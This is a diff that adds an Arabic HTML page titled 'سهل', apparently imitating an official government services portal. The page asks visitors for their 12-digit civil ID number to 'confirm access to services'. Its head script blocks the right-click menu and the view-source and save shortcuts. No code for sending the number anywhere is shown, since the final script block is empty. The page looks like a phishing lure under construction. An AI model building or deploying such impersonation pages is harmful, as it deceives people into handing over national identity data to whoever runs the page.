@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>سهل</title>
+
+  <meta property="og:title" content="اسم الموقع الخاص بك">
+  <meta property="og:description" content="وصف قصير للموقع الخاص بك.">
+  <meta property="og:image" content="https://www.example.com/path/to/image.jpg">
+  <meta property="og:url" content="https://www.example.com">
+  <meta property="og:type" content="website">
+
+  <meta name="twitter:title" content="اسم الموقع الخاص بك">
+  <meta name="twitter:description" content="وصف قصير للموقع الخاص بك.">
+  <meta name="twitter:image" content="https://www.example.com/path/to/image.jpg">
+  <meta name="twitter:card" content="summary_large_image">
+
+  <meta name="description" content="وصف الموقع الخاص بك هنا">
+  <meta name="keywords" content="كلمات مفتاحية تتعلق بالموقع، متجر، خدمات">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="stylesheet" href="index.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <script>
+    document.addEventListener("contextmenu", event => event.preventDefault());
+    document.addEventListener("keydown", event => {
+      if (event.ctrlKey && (event.key === "u" || event.key === "s")) {
+        event.preventDefault();
+      }
+    });
+  </script>
+</head>
+
+<body>
+  <div id="divhedaer">
+    <img id="imghedaer" src="hedimg.png" alt="رأس الصفحة">
+  </div>
+  
+  <hr>
+
+  <img id="bodeimg" src="imghedaer.png" alt="صورة">
+  
+  <h1 id="texbode">يجب إدخال الرقم المدني لتأكيد صلاحية وصولك إلى الخدمات</h1>
+  
+  <div class="box-shadow" id="divform1">
+    <form id="form1">
+      <input
+        id="nomberform"
+        type="tel"
+        name="phone"
+        placeholder="رقم البطاقة المدنية"
+        required
+        maxlength="12"
+        oninvalid="this.setCustomValidity('يرجى إدخال الرقم المدني الصحيح')"
+        oninput="this.setCustomValidity('')">
+      <button id="botonform" type="submit">تسجيل الدخول</button>
+    </form>
+  </div>
+
+  <script>
+
+  </script>
+</body>
+</html>
